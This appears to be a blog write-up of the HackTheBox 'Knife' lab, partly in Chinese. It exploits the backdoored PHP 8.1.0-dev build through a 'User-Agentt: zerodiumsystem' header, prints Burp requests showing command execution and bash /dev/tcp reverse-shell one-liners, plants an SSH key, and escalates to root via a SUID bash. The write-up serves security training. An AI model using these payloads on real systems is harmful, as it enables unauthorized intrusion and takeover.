---
title: Lab - HTB - Esay - Knife
date: 2021-05-29 11:11:11 -0400
description: HackTheBox
categories: [Lab, HackTheBox]
# img: /assets/img/sample/rabbit.png
tags: [Lab, HackTheBox]
---

- [Knife](#knife)
	- [Initial](#initial)
		- [Recon: Nmap&nikto](#recon-nmapnikto)
		- [Recon: Brup](#recon-brup)
		- [CVE](#cve)
			- [漏洞概述](#漏洞概述)
			- [漏洞复现](#漏洞复现)
	- [Gain acess to shell: Brup](#gain-acess-to-shell-brup)
	- [Inthebox](#inthebox)
- [User.txt:](#usertxt)
- [SSH:](#ssh)
- [Privilege-Escalation:](#privilege-escalation)


- ref:
  - [](https://blog.csdn.net/qq_36584013/article/details/117315844)

---

# Knife

![pic](https://miro.medium.com/max/2386/1*r6VB8UjhRBjRQYECPhXyCQ.png)

---

## Initial

### Recon: Nmap&nikto

```
nmap -A 10.10.10.242
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-29 01:01 CDT
Nmap scan report for 10.10.10.242
Host is up (0.028s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.25 seconds
```

Open port 22 and 80

Port 80: a simple web page.

![web](https://miro.medium.com/max/3856/1*EJ4TJ-U64ohnB-HxBn9HUw.png)


```bash
# confirm again
nikto -host 10.10.10.242
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.242
+ Target Hostname:    10.10.10.242
+ Target Port:        80
+ Start Time:         2021-05-29 14:07:49 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ Retrieved x-powered-by header: PHP/8.1.0-dev
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
```


### Recon: Brup

1. Request

```
GET / HTTP/1.1
Host: 10.10.10.242
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

2. Response

```
HTTP/1.1 200 OK
Date: Sat, 29 May 2021 06:18:41 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Vary: Accept-Encoding
Content-Length: 5815
Connection: close
Content-Type: text/html; charset=UTF-8
```

![pic](https://miro.medium.com/max/1916/1*QzcG57XfIxQyBzs78faxZA.png)


php version: **“PHP/8.1.0-dev”.**
- [article](https://blog.csdn.net/qq_44159028/article/details/116992989).


---


### CVE

#### 漏洞概述

PHP开发工程师Jake Birchall在对其中一个恶意COMMIT的分析过程中发现，在代码中注入的后门是来自一个PHP代码被劫持的网站上，并且采用了远程代码执行的操作，并且攻击者盗用了PHP开发人员的名义来提交此COMMIT。

PHP 8.1.0-dev 版本在2021年3月28日被植入后门，但是后门很快被发现并清除。当服务器存在该后门时，攻击者可以通过发送User-Agentt头来执行任意代码。

目前
- PHP官方并未就该事件进行更多披露，表示此次服务器被黑的具体细节仍在调查当中。
- 由于此事件的影响，PHP的官方代码库已经被维护人员迁移至GitHub平台，之后的相关代码更新、修改将会都在GitHub上进行。

**漏洞影响**
- `PHP 8.1.0-dev`


#### 漏洞复现 

1. 环境搭建
   - 利用vulhub搭建环境，进入`/vulhub-master/php/8.1-backdoor`中，执行`docker-compose up -d`启动环境，访问`8080`

2. 文件读取
   - 后门为添加请求头
   - `User-Agentt: zerodiumsystem('id');`

3. reverse shell
   - `nc -nvlp 4444`
   - `bash -c 'exec bash -i &>/dev/tcp/10.10.10.242/4444 <&1'`


---

## Gain acess to shell: Brup

1. 使用burp抓包，并加入字段, 发现被成功执行

![Screen Shot 2021-05-29 at 2.16.20 PM](https://i.imgur.com/xz3NtvI.png)

```bash
# send the request
GET / HTTP/1.1
Host: 10.10.10.242
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
# User-Agentt: zerodiumvar_dump(2*3);
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close


# get the response
HTTP/1.1 200 OK
Date: Sat, 29 May 2021 19:14:58 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Vary: Accept-Encoding
Content-Length: 5822
Connection: close
Content-Type: text/html; charset=UTF-8
# int(6)
<!DOCTYPE html>
```

2. try commands

![Screen Shot 2021-05-29 at 2.15.37 PM](https://i.imgur.com/1MHe7qp.png)

```bash
# request
GET / HTTP/1.1
Host: 10.10.10.242
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
# User-Agentt: zerodiumsystem("id");
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

# response
HTTP/1.1 200 OK
Date: Sat, 29 May 2021 19:16:14 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Vary: Accept-Encoding
Content-Length: 5866
Connection: close
Content-Type: text/html; charset=UTF-8
# uid=1000(james) gid=1000(james) groups=1000(james)
```


3. push a **bash shell** under **“user-agentt”**

```bash
# setup the reverse shell
ncat -l -p 1111
```

```bash
# request
GET / HTTP/1.1
Host: 10.10.10.242
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
# User-Agentt: zerodiumsystem("/bin/bash -c 'bash -i >&/dev/tcp/10.10.14.240/9001 0>&1'");
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```




---

## Inthebox

```bash
whcih python3

python3 -c 'import pty; pty.spawn("/bin/bash")'



```


User.txt:
=========

Let make this shell a stable one and go for our first flag i.e. **User.txt**

![pic](https://miro.medium.com/max/60/1*PkryjetVL9q2jJYMUdFuew.png?q=20)

![pic](https://miro.medium.com/max/1370/1*PkryjetVL9q2jJYMUdFuew.png)

After stabling the shell I found my first flag user.txt

![pic](https://miro.medium.com/max/60/1*op1CfSSKMQTGcz1nu6sF2g.png?q=20)

![pic](https://miro.medium.com/max/1600/1*op1CfSSKMQTGcz1nu6sF2g.png)

Let’s get the _ssh_ shell before proceed to _privilege-escalation_ for that we need to add our _ssh_ public key inside **james** _.ssh_ folder.

![pic](https://miro.medium.com/max/60/1*kIJl3Cq_L1POqnQM9KR2LA.png?q=20)

![pic](https://miro.medium.com/max/3832/1*kIJl3Cq_L1POqnQM9KR2LA.png)

Now I upload **id\_rsa.pub** key inside **authorized\_keys** on the machine.

![pic](https://miro.medium.com/max/60/1*Xtuq_q51vCuWhFakER38kQ.png?q=20)

![pic](https://miro.medium.com/max/3796/1*Xtuq_q51vCuWhFakER38kQ.png)

SSH:
====

Now I tried to login through my own **id\_rsa key** and boom I am inside.

![pic](https://miro.medium.com/max/60/1*7R4tGiXW-I7Mb5N7VyM79g.png?q=20)

![pic](https://miro.medium.com/max/1890/1*7R4tGiXW-I7Mb5N7VyM79g.png)

Privilege-Escalation:
=====================

I search many things inside machine but found nothing interesting.

![pic](https://miro.medium.com/max/60/1*1PXYu5d7UBgDBCm8iMZTDQ.png?q=20)

![pic](https://miro.medium.com/max/2592/1*1PXYu5d7UBgDBCm8iMZTDQ.png)

After this I saw some “Ruby” files so I also programed one and execute it.

![pic](https://miro.medium.com/max/60/1*GmBKl2x_ryr94rEfpf5r6Q.png?q=20)

![pic](https://miro.medium.com/max/1376/1*GmBKl2x_ryr94rEfpf5r6Q.png)

Now I have my own ruby file _‘priv.rb_’ on the machine. In the ruby file I simply give permission to _/bin/bash_ for suid bit set so james user can easily execute the root commands and get my **root.txt**

![pic](https://miro.medium.com/max/60/1*XxLbPPV5FqcnZ_q9cIeIUA.png?q=20)

![pic](https://miro.medium.com/max/980/1*XxLbPPV5FqcnZ_q9cIeIUA.png)

And we are Root and found the **root flag**.

![pic](https://miro.medium.com/freeze/max/60/0*Zgt3uMOlsiZO0aeu.gif?q=20)

![pic](https://miro.medium.com/max/960/0*Zgt3uMOlsiZO0aeu.gif)

So that was it for **knife** box. I hope you liked the **write-up**.

Thanks for reading this far. I will meet in my next article.

H**appy Hacking** ☺
